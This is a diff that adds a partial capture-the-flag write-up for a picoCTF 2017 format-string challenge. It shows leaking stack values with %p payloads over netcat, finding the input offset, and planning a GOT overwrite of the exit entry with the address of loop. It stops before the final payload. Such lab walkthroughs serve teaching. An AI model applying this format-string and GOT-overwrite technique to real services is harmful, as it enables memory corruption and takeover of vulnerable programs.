@@ -1,0 +1,25 @@
+1- By looking at the source, we can see the vunerability that we will exploit. In this case, our input is printed with the printf function directly without format. printf(input). Testing it confirm the vulnerability:
+echo e %p %p %p %p %p %p %p %p %p %p %p %p %p %p | nc shell2017.picoctf.com 29925
+Config action: Exit message set!
+0x7fd8cca6b323 0x7fd8cca6c7a0 0x7fd8cc7a0c00 0x7fd8cca6c7a0 0x2070252070252070 (nil) 0x7ffe4ce56622 0x7ffe4ce56a30 0x400aa6 (nil) 0x7ffe4ce56620 0x7ffe4ce56620 0x7ffe4ce56622 0x2070252070250065
+
+2- address 0x400aa6 seems to be interest because it looks like a text segment adress (place where functions goes). By analysing the function adress, we can identify what it might be :
+nm -x console
+[...]
+00000000004009bd T loop
+0000000000400ad3 T main
+[...]
+0x400aa6 address is between those two functions. By analysing the source code, we can guess that it probably is the return address of the set_exit_message function in the loop function.
+
+3- we also see that our input is also visible. Let us confirm it :
+we use python to print : print "e       "+ "A"*8 + "%p "*20
+python payload.py | nc shell2017.picoctf.com 29925
+Config action: Exit message set!
+      AAAAAAAA0x7f672e3dc323 0x7f672e3dd7a0 0x7f672e111c00 0x7f672e3dd7a0 0x2070252070252070 (nil) 0x7ffcd207e572 0x7ffcd207e980 0x400aa6 (nil) 0x7ffcd207e570 0x7ffcd207e570 0x7ffcd207e572 0x2020202020200065 0x4141414141414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520
+our 'A's are in the 15th pointer value.
+
+4- We want to replace the address of exit function which is 0x601258 by the address of loop. We can have this address information by inputing the command and look at the exit entry:
+readelf --relocs console 
+
+
+
